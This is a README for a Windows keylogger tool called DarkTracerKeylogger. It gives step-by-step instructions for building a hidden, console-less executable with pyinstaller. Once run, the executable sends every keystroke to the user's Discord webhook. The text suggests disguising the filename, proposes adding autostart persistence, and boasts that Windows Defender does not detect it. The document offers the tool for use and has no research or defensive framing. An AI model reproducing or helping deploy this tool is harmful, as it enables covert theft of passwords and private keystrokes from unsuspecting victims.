# How it works
After creating the executable file (*.exe*) using *pyinstaller*, once you launch the file on a Windows machine, **the keylogger will work hidden, sending everything is typed with the keyboard to your Discord Webhook.**

# How to use it
- Download the tool:
```bash
git clone https://github.com/Uriel-SG/DarkTracerKeylogger.git
```
- Edit the python code inserting your Discord Webhook:
```python
# URL del webhook Discord
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR-WEBHOOK-HERE"
```
- If you want, you can change the filename from dark_tracer.py to *whatever-you-want.py*;
- If you don't have it yet, install *pyinstaller*:
```bash
pip install pyinstaller
```
- Create your .exe file using *pyinstaller*:
```bash
pyinstaller --onefile --noconsole --hidden-import=pynput YOUR-FILE.py
```
(if you want you can add an icon adding *"--icon YOUR_ICO.ico"*)

- In the "dist" folder created you'll find the *.exe* file ready: *just start it*.

# üßë‚Äçüíª How to stop the process 
Simply open Windows Task Manager, locate the process, and end the task.

# üî• Future Improvements
To improve the project, the ideal would be to ensure that the executable file, once started, makes a copy of itself in the Windows "autostart" folder, so that the keylogger starts at every startup.

# üõ°Ô∏è Antivirus?
As you can see in the video, my ***Windows Defender doesn't detect the .exe file as a threat***. **Let me know!**
